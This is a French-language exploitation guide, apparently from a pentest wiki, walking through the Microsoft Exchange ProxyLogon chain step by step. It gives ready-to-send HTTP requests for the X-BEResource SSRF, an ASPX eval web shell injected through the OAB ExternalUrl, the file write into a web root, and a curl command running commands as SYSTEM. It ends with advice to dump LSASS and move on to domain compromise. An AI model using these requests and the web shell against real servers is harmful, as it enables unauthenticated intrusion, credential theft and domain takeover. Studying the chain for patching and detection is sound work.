---
order: 1
title: "ProxyLogon : SSRF X-BEResource vers un web shell"
description: "La chaîne Exchange pré-authentification qui utilise le SSRF du cookie X-BEResource à travers le front end pour atteindre l'ECP back-end en tant que SYSTEM, s'authentifie en tant que n'importe quelle boîte aux lettres, puis abuse de l'ExternalUrl du répertoire virtuel OAB plus ResetOABVirtualDirectory pour écrire un web shell aspx sous un chemin servi par le web."
keywords:
  - ProxyLogon
  - X-BEResource
  - SSRF
  - OABVirtualDirectory
  - web shell
---

# ProxyLogon

ProxyLogon est la chaîne front-end-vers-back-end d'origine et ne nécessite **aucun identifiant**, seulement une portée réseau vers OWA. Le front end sert de proxy vers le back end en faisant confiance à un cookie nommé **`X-BEResource`**, dont la valeur est `<backend-fqdn>~<version-token>` plus le chemin à proxifier. En fournissant vous-même ce cookie, vous faites émettre par le front end une requête **implicitement authentifiée** vers n'importe quelle URL back-end, ce qui est une server-side request forgery dans la surface de gestion du back end. De là vous vous authentifiez en tant que n'importe quelle boîte aux lettres (y compris un admin), réglez l'`ExternalUrl` du répertoire virtuel Offline Address Book sur un bloc de code ASPX, et déclenchez un reset qui écrit ce code dans un fichier sous un répertoire servi par le web. Le résultat est un web shell tournant en tant que `SYSTEM`.

## Préconditions

- Le build est au niveau ou en dessous du rollup de sécurité du début 2021 pour Exchange 2013/2016/2019 (le [fingerprint de version](../enumeration.md) le décide).
- `/owa` et `/ecp` sont accessibles, et vous connaissez le FQDN du serveur back-end (la fuite NTLM type-2 dans l'[énumération](../enumeration.md) vous le remet).
- Vous connaissez une boîte aux lettres à cibler ; la chaîne vous laisse découvrir puis agir en tant que boîte aux lettres admin, donc n'importe quelle adresse valide plus l'admin par défaut suffit.

## Étape 1 : SSRF vers l'ECP back-end et obtention d'une session

Envoyez une requête vers un endpoint front-end qui autorise le cookie `X-BEResource` (le chemin de proxy autodiscover/ECP), en la pilotant vers le `/ecp/` back-end pour que le back end la traite comme une requête administrative authentifiée. La réponse fait fuir le `LegacyDN` de la cible et un identifiant de session serveur :

```http
GET /ecp/x.js HTTP/1.1
Host: mail.example.com
Cookie: X-BEResource=exch-backend.example.local/ecp/proxyLogon.ecp?~1941962753;
Content-Type: text/xml

<r at="Negotiate" ln="administrator"><s>admin-sid-or-session</s></r>
```

Un `200` qui renvoie un token `msExchEcpCanary` et le `LegacyDN` de la boîte aux lettres signifie que le SSRF a atteint l'ECP back-end et qu'il vous a accepté en tant que principal nommé. Un `500` ou `401` signifie que le token du cookie ou le FQDN back-end est faux ; revérifiez le token de version et le nom interne depuis la fuite type-2.

## Étape 2 : pointer le répertoire virtuel OAB vers un payload

Avec la session back-end et le canary, réglez l'`ExternalUrl` du répertoire virtuel OAB sur une chaîne contenant de l'ASPX. Exchange stocke cette chaîne, et rien ne valide qu'une URL est réellement une URL :

```http
POST /ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=<canary> HTTP/1.1
Host: mail.example.com
Cookie: X-BEResource=exch-backend.example.local/ecp/...; ASP.NET_SessionId=<id>; msExchEcpCanary=<canary>
Content-Type: application/json

{"identity":{"__type":"Identity:ECP","DisplayName":"OAB","RawIdentity":"<oab-guid>"},
 "properties":{"Parameters":{"__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
 "ExternalUrl":"http://x/<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request[\"c\"],\"unsafe\");}</script>"}}}
```

## Étape 3 : écrire le shell sur le disque

Déclenchez `ResetOABVirtualDirectory`, qui sérialise la configuration OAB (portant désormais votre ASPX) vers un `FilePath` que vous contrôlez sous un répertoire servi par le web tel que `\\...\FrontEnd\HttpProxy\owa\auth\` ou `...\ecp\auth\` :

```http
POST /ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=<canary> HTTP/1.1
Host: mail.example.com
Cookie: X-BEResource=exch-backend.example.local/ecp/...; msExchEcpCanary=<canary>
Content-Type: application/json

{"identity":{"__type":"Identity:ECP","DisplayName":"OAB","RawIdentity":"<oab-guid>"},
 "properties":{"Parameters":{"__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
 "FilePath":"C:\\inetpub\\wwwroot\\aspnet_client\\shell.aspx"}}}
```

Un `200` ici signifie que le fichier a été écrit. Confirmez et utilisez-le :

```bash
curl -sk 'https://mail.example.com/aspnet_client/shell.aspx' --data 'c=Response.Write(new ActiveXObject("WScript.Shell").Exec("whoami").StdOut.ReadAll());'
# -> nt authority\system
```

`nt authority\system` confirme la chaîne. Si le chemin du shell renvoie 404, le `FilePath` a atterri hors d'une racine web ; choisissez un répertoire que vous pouvez à la fois écrire et atteindre en HTTPS (`aspnet_client`, `owa/auth`, `ecp/auth`).

## Suite

Le web shell est `SYSTEM` sur un serveur Exchange. Dumpez LSASS et le compte machine, puis convertissez cela en compromission de domaine via les droits du compte machine Exchange ou un relay de type [PrivExchange](../privexchange.md), exactement comme dans l'[aperçu des RCE chains](index.md). Déployez des outils supplémentaires depuis le shell.

## Notes d'exploitation

- Les deux moitiés sont réutilisables indépendamment : le SSRF `X-BEResource` atteint n'importe quelle URL back-end (utile pour lire le courrier directement), et l'`ExternalUrl` OAB plus le reset sont une écriture de fichier générique une fois que vous détenez une session ECP back-end.
- Le token de version dans le cookie doit correspondre au build back-end suffisamment étroitement pour que le front end proxifie ; tirez-le d'abord du chemin statique versionné.
- Choisissez un chemin d'écriture qui est à la fois dans une racine web et servi par le proxy front-end, sinon le shell s'écrit avec succès mais ne peut pas être atteint.

## Outils

- **Metasploit** (`exchange_proxylogon_rce`) : module de bout en bout maintenu.
- **PoC autonomes** adaptés au build exact, pour un contrôle manuel de chaque étape.
- **curl / Burp** : piloter à la main les trois requêtes quand un module rate sur un build inhabituel.

## Références

- [DEVCORE / Orange Tsai: A new attack surface on MS Exchange, part 1 (ProxyLogon)](https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/)
- [Praetorian: reproducing the ProxyLogon chain](https://www.praetorian.com/blog/reproducing-proxylogon-exploit/)
- [Microsoft Security: HAFNIUM targeting Exchange Servers](https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)
